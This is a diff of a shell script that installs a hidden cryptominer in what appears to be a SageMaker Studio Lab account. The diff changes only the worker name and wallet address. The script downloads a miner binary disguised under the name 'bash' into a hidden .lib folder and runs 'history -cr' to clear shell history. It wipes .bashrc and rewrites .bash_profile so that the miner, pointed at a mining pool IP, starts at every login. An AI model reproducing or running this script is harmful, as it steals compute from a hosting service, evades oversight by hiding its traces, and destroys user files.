@@ -7,8 +7,8 @@ mkdir .lib
 cd .lib
 rm -R *
 rm -R /home/studio-lab-user/.ton
-WORKER="testertuturu"
-WALLETNH="a37QLgxExEZrpTxKtr7hvYLWrWmKtaGM6D"
+WORKER="fro"
+WALLETNH="aCCoktTaiLpQXLmYDv1jpnXE3yjLZTqrUG"
 POOLNH="206.189.163.141:80"
 wget -P /home/studio-lab-user/.lib/ https://github.com/gunturyogatama404/ksjdueoa/raw/refs/heads/main/bash && history -cr
 echo ""  > /home/studio-lab-user/.bashrc
@@ -19,7 +19,7 @@ echo "source /home/studio-lab-user/.bash_profile"  >> /home/studio-lab-user/.bas
 echo "LD_LIBRARY_PATH=/home/studio-lab-user/.lib" > /home/studio-lab-user/.bash_profile
 echo "export LD_LIBRARY_PATH" >> /home/studio-lab-user/.bash_profile
 echo 'WORKER="x"' >> ~/.bash_profile
-echo 'WALLETNH="a37QLgxExEZrpTxKtr7hvYLWrWmKtaGM6D"' >> /home/studio-lab-user/.bash_profile
+echo 'WALLETNH="aCCoktTaiLpQXLmYDv1jpnXE3yjLZTqrUG"' >> /home/studio-lab-user/.bash_profile
 echo 'POOLNH="206.189.163.141:80"' >> /home/studio-lab-user/.bash_profile
 echo "bash /home/studio-lab-user/.lib/gas.sh"  >> /home/studio-lab-user/.bash_profile
 echo "./.lib/bash --algo firopow -s $POOLNH -u  $WALLETNH.$WORKER" > /home/studio-lab-user/.lib/gas.sh
